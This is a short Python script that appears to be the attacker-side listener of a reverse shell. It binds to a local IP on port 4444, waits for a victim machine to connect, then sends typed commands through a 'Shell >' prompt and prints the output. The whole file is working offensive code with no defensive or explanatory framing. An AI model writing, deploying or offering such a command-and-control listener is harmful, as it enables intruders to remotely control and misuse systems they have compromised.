import socket

server_ip = '192.168.1.6'
port = 4444

def target_communication():
    while True:
        command = input('Shell > ')
        conn.send(command.encode())
        if command == 'quit':
            conn.close()
            break
        elif command[:3] == 'cd ':
            continue
        else:
            result = conn.recv(2048).decode()
            print(result)


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((server_ip, port))
print('[+].... Listning ')
server.listen(3)
conn, ip = server.accept()
print('[+] connected ...... ', ip[0])
# all communication happen inside target_communication function
target_communication()
